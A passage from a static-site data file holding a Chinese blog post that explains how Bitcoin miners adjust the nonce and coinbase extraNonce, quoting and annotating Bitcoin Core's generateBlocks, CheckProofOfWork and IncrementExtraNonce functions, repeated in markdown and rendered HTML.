pblocktemplate(BlockAssembler(Params()).CreateNewBlock(coinbaseScript->reserveScript));\n\t\tif (!pblocktemplate.get())\n\t\t  throw JSONRPCError(RPC_INTERNAL_ERROR, \"Couldn't create new block\");\n\t\t// pblock 待构建区块\n\t\tCBlock *pblock = &pblocktemplate->block;\n\t\t{\n\t\t\tLOCK(cs_main);\n\t\t\t// 调整CoinBase输入脚本中的nExtranNonce\n\t\t\tIncrementExtraNonce(pblock, chainActive.Tip(), nExtraNonce);\n\t\t}\n\t\t// pblock->nNonce < nInnerLoopCount 区块头随机数调整次数不能超过nInnerLooCount\n\t\t// CheckProofOfWork(pblock->GetHash(),pblock->nBits,Params().GetConsensus()) 校验当前区块头Hash值是否满足要求\n\t\twhile (nMaxTries > 0 && pblock->nNonce < nInnerLoopCount &&!CheckProofOfWork(pblock->GetHash(), pblock->nBits,Params().GetConsensus())) {\n\t\t\t// nNonce++\n\t\t\t++pblock->nNonce;\n\t\t\t--nMaxTries;\n\t\t}\n\t\t// 超过最大尝试次数，退出循环\n\t\tif (nMaxTries == 0) {\n\t\t\tbreak;\n\t\t}\n\t\t// 达到内循环次数上限，调整CoinBase交易的nExtraNonce，重新开始循环\n\t\tif (pblock->nNonce == nInnerLoopCount) {\n\t\t\tcontinue;\n\t\t}\n\t\tstd::shared_ptr<const CBlock> shared_pblock = std::make_shared<const CBlock>(*pblock);\n\t\t// 处理挖到的区块\n\t\tif (!ProcessNewBlock(Params(), shared_pblock, true, nullptr))\n\t\t    throw JSONRPCError(RPC_INTERNAL_ERROR, \"ProcessNewBlock, block not accepted\");\n\t\t++nHeight;\n\t\t// 存放区块头Hash\n\t\tblockHashes.push_back(pblock->GetHash().GetHex());\n\n\t\t//mark script as important because it was used at least for one coinbase output if the script came from the wallet\n\t\tif (keepScript)\n\t\t{\n\t\t\tcoinbaseScript->KeepScript();\n\t\t}\n\t}\n\treturn blockHashes;\n}\n```\n[校验工作量函数](https://github.com/bitcoin/bitcoin/blob/5961b23898ee7c0af2626c46d5d70e80136578d3/src/pow.cpp#L74)\n```\nbool CheckProofOfWork(uint256 hash, unsigned int nBits, const Consensus::Params& params)\n{\n\tbool fNegative;\n\tbool fOverflow;\n\tarith_uint256 bnTarget;\n\n\tbnTarget.SetCompact(nBits, &fNegative, &fOverflow);\n\n\t// Check range\n\tif (fNegative || bnTarget == 0 || fOverflow || bnTarget > UintToArith256(params.powLimit))\n\t  return false;\n\n\t// Check proof of work matches claimed amount\n\t// 比较区块头hash值是否满足目标值\n\tif (UintToArith256(hash) > bnTarget)\n\t    return false;\n\n\treturn true;\n}\n```\n[调整CoinBase输入字段函数](https://github.com/bitcoin/bitcoin/blob/44080a90a29292df96e92f22242785c5040000a1/src/miner.cpp#L442)\n```\nvoid IncrementExtraNonce(CBlock* pblock, const CBlockIndex* pindexPrev,unsigned int& nExtraNonce)\n{\n\t// Update nExtraNonce\n\tstatic uint256 hashPrevBlock;\n\tif (hashPrevBlock != pblock->hashPrevBlock)\n\t{\n\t\tnExtraNonce = 0;\n\t\thashPrevBlock = pblock->hashPrevBlock;\n\t}\n\t// nExtranNonce调整\n\t++nExtraNonce;\n\t// 正在打包的区块高度从版本2开始，要求coinbase交易的输入脚本以本区块高度开头\n\tunsigned int nHeight = pindexPrev->nHeight+1; // Height first in coinbase required for block.version=2\n\tCMutableTransaction txCoinbase(*pblock->vtx[0]);\n\t// 构建coinbase交易的输入脚本\n\ttxCoinbase.vin[0].scriptSig = (CScript() << nHeight << CScriptNum(nExtraNonce)) + COINBASE_FLAGS;\n\tassert(txCoinbase.vin[0].scriptSig.size() <= 100);\n\n\tpblock->vtx[0] = MakeTransactionRef(std::move(txCoinbase));\n\t// 重新构建Merkle数，计算MerkleRoot\n\tpblock->hashMerkleRoot = BlockMerkleRoot(*pblock);\n}\n```\n","slug":"比特币挖矿之随机数","published":1,"updated":"2018-03-09T09:32:59.585Z","layout":"post","photos":[],"link":"","_id":"cjf7piawb0028pkwoac2uzepf","content":"<h2 id=\"比特币区块头字段分析\"><a href=\"#比特币区块头字段分析\" class=\"headerlink\" title=\"比特币区块头字段分析\"></a>比特币区块头字段分析</h2><p>在<a href=\"https://xingyunbite.github.io/2018/02/28/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E7%9F%BF%E5%B7%A5%E4%BB%BB%E5%8A%A1-1/\" target=\"_blank\" rel=\"noopener\">比特币挖矿之矿工任务</a>中已经提到矿工的工作量主要就消耗在寻找使区块满足要求的随机数这一步。在比特币区块头的6个字段中，区块版本号nVersion只有在升级的时候才会改变。上一个区块Hash值hashPrevBlock在矿工不想制造软分叉的情况下，由最长链的最后一个区块决定。全网难度压缩表示<a href=\"https://xingyunbite.github.io/2018/02/09/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E5%85%A8%E7%BD%91%E9%9A%BE%E5%BA%A6/\" target=\"_blank\" rel=\"noopener\">nBits</a>由全网决定,每2016个区块重新调整一次，调整算法固定。上述三个字段对于每个矿工来说，可以理解为固定的。随机数nNonce即我们要找的解，因其字段大小为4字节，32位，因此存在2^32种可能。打包时间nTime可调整的范围根据前一个区块时间来决定，比上一个区块太超前或者太落后会被其他节点拒绝，一般情况下，矿工会直接使用机器当前时间戳。Merkle树根hashMerkleRoot，因其字段长度为256位，理论上存在2^256种可能，本字段的变化主要在于修改CoinBase交易的输入字段，CoinBase交易的改变会传导到至hashMerkleRoot。根据Hash函数特性，nNonce、nTime、hashMerkleRoot任意改变一个，都会导致区块头Hash值结果产生巨大变化。</p>\n<h2 id=\"随机数调整\"><a href=\"#随机数调整\" class=\"headerlink\" title=\"随机数调整\"></a>随机数调整</h2><p>比特币挖矿的修改主要是体现在调整随机数nNonce上，但是随着算力的不断增长，2^32的调整空间已经很难满足求解的需要，因此比特币采取的处理方式是当遍历完2^32个随机数空间后，调整CoinBase的输入字段，致使hashMerkleRoot改变，再次遍历随机数空间，直到发现满足要求的解为止。当然正常情况下，矿工无法遍历完所有的调整空间(2^256 * 2^32)。下面主要以分析代码的方式展示随机数的调整机制。<br><a href=\"https://github.com/bitcoin/bitcoin/blob/fd65937ec601326b479654a5ad14847adcdb214c/src/rpc/mining.cpp#L106\" target=\"_blank\" rel=\"noopener\">构建区块头函数</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UniValue generateBlocks(std::shared_ptr&lt;CReserveScript&gt; coinbaseScript, int nGenerate, uint64_t nMaxTries, bool keepScript)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// 内循环次数上限 nNonce的调整空间[0,2^16)</span><br><span class=\"line\">\tstatic const int nInnerLoopCount = 0x10000;</span><br><span class=\"line\">\tint nHeightEnd = 0;</span><br><span class=\"line\">\tint nHeight = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#123;   // Don&apos;t keep cs_main locked</span><br><span class=\"line\">\t\tLOCK(cs_main);</span><br><span class=\"line\">\t\t// 区块当前高度</span><br><span class=\"line\">\t\tnHeight = chainActive.Height();</span><br><span class=\"line\">\t\t// 待生成区块高度</span><br><span class=\"line\">\t\tnHeightEnd = nHeight+nGenerate;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t// nExtraNonce 为CoinBase交易输入部分</span><br><span class=\"line\">\tunsigned int nExtraNonce = 0;</span><br><span class=\"line\">\tUniValue blockHashes(UniValue::VARR);</span><br><span class=\"line\">\t// 循环生成区块，直到达到指定高度</span><br><span class=\"line\">\twhile (nHeight &lt; nHeightEnd)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t// 创建区块模板</span><br><span class=\"line\">\t\tstd::unique_ptr&lt;CBlockTemplate&gt; pblocktemplate(BlockAssembler(Params()).CreateNewBlock(coinbaseScript-&gt;reserveScript));</span><br><span class=\"line\">\t\tif (!pblocktemplate.get())</span><br><span class=\"line\">\t\t  throw JSONRPCError(RPC_INTERNAL_ERROR, &quot;Couldn&apos;t create new block&quot;);</span><br><span class=\"line\">\t\t// pblock 待构建区块</span><br><span class=\"line\">\t\tCBlock *pblock = &amp;pblocktemplate-&gt;block;</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tLOCK(cs_main);</span><br><span class=\"line\">\t\t\t// 调整CoinBase输入脚本中的nExtranNonce</span><br><span class=\"line\">\t\t\tIncrementExtraNonce(pblock, chainActive.Tip(), nExtraNonce);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t// pblock-&gt;nNonce &lt; nInnerLoopCount 区块头随机数调整次数不能超过nInnerLooCount</span><br><span class=\"line\">\t\t// CheckProofOfWork(pblock-&gt;GetHash(),pblock-&gt;nBits,Params().GetConsensus()) 校验当前区块头Hash值是否满足要求</span><br><span class=\"line\">\t\twhile (nMaxTries &gt; 0 &amp;&amp; pblock-&gt;nNonce &lt; nInnerLoopCount &amp;&amp;!CheckProofOfWork(pblock-&gt;GetHash(), pblock-&gt;nBits,Params().GetConsensus())) &#123;</span><br><span class=\"line\">\t\t\t// nNonce++</span><br><span class=\"line\">\t\t\t++pblock-&gt;nNonce;</span><br><span class=\"line\">\t\t\t--nMaxTries;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t// 超过最大尝试次数，退出循环</span><br><span class=\"line\">\t\tif (nMaxTries == 0) &#123;</span><br><span class=\"line\">\t\t\tbreak;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t// 达到内循环次数上限，调整CoinBase交易的nExtraNonce，重新开始循环</span><br><span class=\"line\">\t\tif (pblock-&gt;nNonce == nInnerLoopCount) &#123;</span><br><span class=\"line\">\t\t\tcontinue;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tstd::shared_ptr&lt;const CBlock&gt; shared_pblock = std::make_shared&lt;const CBlock&gt;(*pblock);</span><br><span class=\"line\">\t\t// 处理挖到的区块</span><br><span class=\"line\">\t\tif (!ProcessNewBlock(Params(), shared_pblock, true, nullptr))</span><br><span class=\"line\">\t\t    throw JSONRPCError(RPC_INTERNAL_ERROR, &quot;ProcessNewBlock, block not accepted&quot;);</span><br><span class=\"line\">\t\t++nHeight;</span><br><span class=\"line\">\t\t// 存放区块头Hash</span><br><span class=\"line\">\t\tblockHashes.push_back(pblock-&gt;GetHash().GetHex());</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t//mark script as important because it was used at least for one coinbase output if the script came from the wallet</span><br><span class=\"line\">\t\tif (keepScript)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tcoinbaseScript-&gt;KeepScript();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn blockHashes;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://github.com/bitcoin/bitcoin/blob/5961b23898ee7c0af2626c46d5d70e80136578d3/src/pow.cpp#L74\" target=\"_blank\" rel=\"noopener\">校验工作量函数</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bool CheckProofOfWork(uint256 hash, unsigned int nBits, const Consensus::Params&amp; params)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tbool fNegative;</span><br><span class=\"line\">\tbool fOverflow;</span><br><span class=\"line\">\tarith_uint256 bnTarget;</span><br><span class=\"line\"></span><br><span class=\"line\">\tbnTarget.SetCompact(nBits, &amp;fNegative, &amp;fOverflow);</span><br><span class=\"line\"></span><br><span class=\"line\">\t// Check range</span><br><span class=\"line\">\tif (fNegative || bnTarget == 0 || fOverflow || bnTarget &gt; UintToArith256(params.powLimit))</span><br><span class=\"line\">\t  return false;</span><br><span class=\"line\"></span><br><span class=\"line\">\t// Check proof of work matches claimed amount</span><br><span class=\"line\">\t// 比较区块头hash值是否满足目标值</span><br><span class=\"line\">\tif (UintToArith256(hash) &gt; bnTarget)</span><br><span class=\"line\">\t    return false;</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn true;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://github.com/bitcoin/bitcoin/blob/44080a90a29292df96e92f22242785c5040000a1/src/miner.cpp#L442\" target=\"_blank\" rel=\"noopener\">调整CoinBase输入字段函数</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void IncrementExtraNonce(CBlock* pblock, const CBlockIndex* pindexPrev,unsigned int&amp; nExtraNonce)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// Update nExtraNonce</span><br><span class=\"line\">\tstatic uint256 hashPrevBlock;</span><br><span class=\"line\">\tif (hashPrevBlock != pblock-&gt;hashPrevBlock)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tnExtraNonce = 0;</span><br><span class=\"line\">\t\thashPrevBlock = pblock-&gt;hashPrevBlock;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t// nExtranNonce调整</span><br><span class=\"line\">\t++nExtraNonce;</span><br><span class=\"line\">\t// 正在打包的区块高度从版本2开始，要求coinbase交易的输入脚本以本区块高度开头</span><br><span class=\"line\">\tunsigned int nHeight = pindexPrev-&gt;nHeight+1; // Height first in coinbase required for block.version=2</span><br><span class=\"line\">\tCMutableTransaction txCoinbase(*pblock-&gt;vtx[0]);</span><br><span class=\"line\">\t// 构建coinbase交易的输入脚本</span><br><span class=\"line\">\ttxCoinbase.vin[0].scriptSig = (CScript() &lt;&lt; nHeight &lt;&lt; CScriptNum(nExtraNonce)) + COINBASE_FLAGS;</span><br><span class=\"line\">\tassert(txCoinbase.vin[0].scriptSig.size() &lt;= 100);</span><br><span class=\"line\"></span><br><span class=\"line\">\tpblock-&gt;vtx[0] = MakeTransactionRef(std::move(txCoinbase));</span><br><span class=\"line\">\t// 重新构建Merkle数，计算MerkleRoot</span><br><span class=\"line\">\tpblock-&gt;hashMerkleRoot = BlockMerkleRoot(*pblock);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"比特币区块头字段分析\"><a href=\"#比特币区块头字段分析\" class=\"headerlink\" title=\"比特币区块头字段分析\"></a>比特币区块头字段分析</h2><p>在<a href=\"https://xingyunbite.github.io/2018/02/28/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E7%9F%BF%E5%B7%A5%E4%BB%BB%E5%8A%A1-1/\" target=\"_blank\" rel=\"noopener\">比特币挖矿之矿工任务</a>中已经提到矿工的工作量主要就消耗在寻找使区块满足要求的随机数这一步。在比特币区块头的6个字段中，区块版本号nVersion只有在升级的时候才会改变。上一个区块Hash值hashPrevBlock在矿工不想制造软分叉的情况下，由最长链的最后一个区块决定。全网难度压缩表示<a href=\"https://xingyunbite.github.io/2018/02/09/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E5%85%A8%E7%BD%91%E9%9A%BE%E5%BA%A6/\" target=\"_blank\" rel=\"noopener\">nBits</a>由全网决定,每2016个区块重新调整一次，调整算法固定。上述三个字段对于每个矿工来说，可以理解为固定的。随机数nNonce即我们要找的解，因其字段大小为4字节，32位，因此存在2^32种可能。打包时间nTime可调整的范围根据前一个区块时间来决定，比上一个区块太超前或者太落后会被其他节点拒绝，一般情况下，矿工会直接使用机器当前时间戳。Merkle树根hashMerkleRoot，因其字段长度为256位，理论上存在2^256种可能，本字段的变化主要在于修改CoinBase交易的输入字段，CoinBase交易的改变会传导到至hashMerkleRoot。根据Hash函数特性，nNonce、nTime、hashMerkleRoot任意改变一个，都会导致区块头Hash值结果产生巨大变化。</p>\n<h2 id=\"随机数调整\"><a href=\"#随机数调整\" class=\"headerlink\" title=\"随机数调整\"></a>随机数调整</h2><p>比特币挖矿的修改主要是体现在调整随机数nNonce上，但是随着算力的不断增长，2^32的调整空间已经很难满足求解的需要，因此比特币采取的处理方式是当遍历完2^32个随机数空间后，调整CoinBase的输入字段，致使hashMerkleRoot改变，再次遍历随机数空间，直到发现满足要求的解为止。当然正常情况下，矿工无法遍历完所有的调整空间(2^256 * 2^32)。下面主要以分析代码的方式展示随机数的调整机制。<br><a href=\"https://github.com/bitcoin/bitcoin/blob/fd65937ec601326b479654a5ad14847adcdb214c/src/rpc/mining.cpp#L106\" target=\"_blank\" rel=\"noopener\">构建区块头函数</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UniValue generateBlocks(std::shared_ptr&lt;CReserveScript&gt; coinbaseScript, int nGenerate, uint64_t nMaxTries, bool keepScript)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// 内循环次数上限 nNonce的调整空间[0,2^16)</span><br><span class=\"line\">\tstatic const int nInnerLoopCount = 0x10000;</span><br><span class=\"line\">\tint nHeightEnd = 0;</span><br><span class=\"line\">\tint nHeight = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#123;   // Don&apos;t keep cs_main locked</span><br><span class=\"line\">\t\tLOCK(cs_main);</span><br><span class=\"line\">\t\t// 区块当前高度</span><br><span class=\"line\">\t\tnHeight = chainActive.Height();</span><br><span class=\"line\">\t\t// 待生成区块高度</span><br><span class=\"line\">\t\tnHeightEnd = nHeight+nGenerate;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t// nExtraNonce 为CoinBase交易输入部分</span><br><span class=\"line\">\tunsigned int nExtraNonce = 0;</span><br><span class=\"line\">\tUniValue blockHashes(UniValue::VARR);</span><br><span class=\"line\">\t// 循环生成区块，直到达到指定高度</span><br><span class=\"line\">\twhile (nHeight &lt; nHeightEnd)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t// 创建区块模板</span><br><span class=\"line\">\t\tstd::unique_ptr&lt;CBlockTemplate&gt; pblocktemplate(BlockAssembler(Params()).CreateNewBlock(coinbaseScript-&gt;reserveScript));</span><br><span class=\"line\">\t\tif (!pblocktemplate.get())</span><br><span class=\"line\">\t\t  throw JSONRPCError(RPC_INTERNAL_ERROR, &quot;Couldn&apos;t create new block&quot;);</span><br><span class=\"line\">\t\t// pblock 待构建区块</span><br><span class=\"line\">\t\tCBlock *pblock = &amp;pblocktemplate-&gt;block;</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tLOCK(cs_main);</span><br><span class=\"line\">\t\t\t// 调整CoinBase输入脚本中的nExtranNonce</span><br><span class=\"line\">\t\t\tIncrementExtraNonce(pblock, chainActive.Tip(), nExtraNonce);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t// pblock-&gt;nNonce &lt; nInnerLoopCount 区块头随机数调整次数不能超过nInnerLooCount</span><br><span class=\"line\">\t\t// CheckProofOfWork(pblock-&gt;GetHash(),pblock-&gt;nBits,Params().GetConsensus()) 校验当前区块头Hash值是否满足要求</span><br><span class=\"line\">\t\twhile (nMaxTries &gt; 0 &amp;&amp; pblock-&gt;nNonce &lt; nInnerLoopCount &amp;&amp;!CheckProofOfWork(pblock-&gt;GetHash(), pblock-&gt;nBits,Params().GetConsensus())) &#123;</span><br><span class=\"line\">\t\t\t// nNonce++</span><br><span class=\"line\">\t\t\t++pblock-&gt;nNonce;</span><br><span class=\"line\">\t\t\t--nMaxTries;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t// 超过最大尝试次数，退出循环</span><br><span class=\"line\">\t\tif (nMaxTries == 0) &#123;</span><br><span class=\"line\">\t\t\tbreak;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t// 达到内循环次数上限，调整CoinBase交易的nExtraNonce，重新开始循环</span><br><span class=\"line\">\t\tif (pblock-&gt;nNonce == nInnerLoopCount) &#123;</span><br><span class=\"line\">\t\t\tcontinue;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tstd::shared_ptr&lt;const CBlock&gt; shared_pblock = std::make_shared&lt;const CBlock&gt;(*pblock);</span><br><span class=\"line\">\t\t// 处理挖到的区块</span><br><span class=\"line\">\t\tif (!ProcessNewBlock(Params(), shared_pblock, true, nullptr))</span><br><span class=\"line\">\t\t    throw JSONRPCError(RPC_INTERNAL_ERROR, &quot;ProcessNewBlock, block not accepted&quot;);</span><br><span class=\"line\">\t\t++nHeight;</span><br><span class=\"line\">\t\t// 存放区块头Hash</span><br><span class=\"line\">\t\tblockHashes.push_back(pblock-&gt;GetHash().GetHex());</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t//mark script as important because it was used at least for one coinbase output if the script came from the wallet</span><br><span class=\"line\">\t\tif (keepScript)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tcoinbaseScript-&gt;KeepScript();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn blockHashes;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://github.com/bitcoin/bitcoin/blob/5961b23898ee7c0af2626c46d5d70e80136578d3/src/pow.cpp#L74\" target=\"_blank\" rel=\"noopener\">校验工作量函数</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bool CheckProofOfWork(uint256 hash, unsigned int nBits, const Consensus::Params&amp; params)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tbool fNegative;</span><br><span class=\"line\">\tbool fOverflow;</span><br><span class=\"line\">\tarith_uint256 bnTarget;</span><br><span class=\"line\"></span><br><span class=\"line\">\tbnTarget.SetCompact(nBits, &amp;fNegative, &amp;fOverflow);</span><br><span class=\"line\"></span><br><span class=\"line\">\t// Check range</span><br><span class=\"line\">\tif (fNegative || bnTarget == 0 || fOverflow || bnTarget &gt; UintToArith256(params.powLimit))</span><br><span class=\"line\">\t  return false;</span><br><span class=\"line\"></span><br><span class=\"line\">\t// Check proof of work matches claimed amount</span><br><span class=\"line\">\t// 比较区块头hash值是否满足目标值</span><br><span class=\"line\">\tif (UintToArith256(hash) &gt; bnTarget)</span><br><span class=\"line\">\t    return false;</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn true;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://github.com/bitcoin/bitcoin/blob/44080a90a29292df96e92f22242785c5040000a1/src/miner.cpp#L442\" target=\"_blank\" rel=\"noopener\">调整CoinBase输入字段函数</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void IncrementExtraNonce(CBlock* pblock, const CBlockIndex* pindexPrev,unsigned int&amp; nExtraNonce)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// Update nExtraNonce</span><br><span class=\"line\">\tstatic uint256 hashPrevBlock;</span><br><span class=\"line\">\tif (hashPrevBlock != pblock-&gt;hashPrevBlock)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tnExtraNonce = 0;</span><br><span class=\"line\">\t\thashPrevBlock = pblock-&gt;hashPrevBlock;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t// nExtranNonce调整</span><br><span class=\"line\">\t++nExtraNonce;</span><br><span class=\"line\">\t// 正在打包的区块高度从版本2开始，要求coinbase交易的输入脚本以本区块高度开头</span><br><span class=\"line\">\tunsigned int nHeight = pindexPrev-&gt;nHeight+1; // Height first in coinbase required for block.version=2</span><br><span class=\"line\">\tCMutableTransaction txCoinbase(*pblock-&gt;vtx[0]);</span><br><span class=\"line\">\t// 构建coinbase交易的输入脚本</span><br><span class=\"line\">\ttxCoinbase.vin[0].scriptSig = (CScript() &lt;&lt; nHeight &lt;&lt; CScriptNum(nExtraNonce)) + COINBASE_FLAGS;</span><br><span 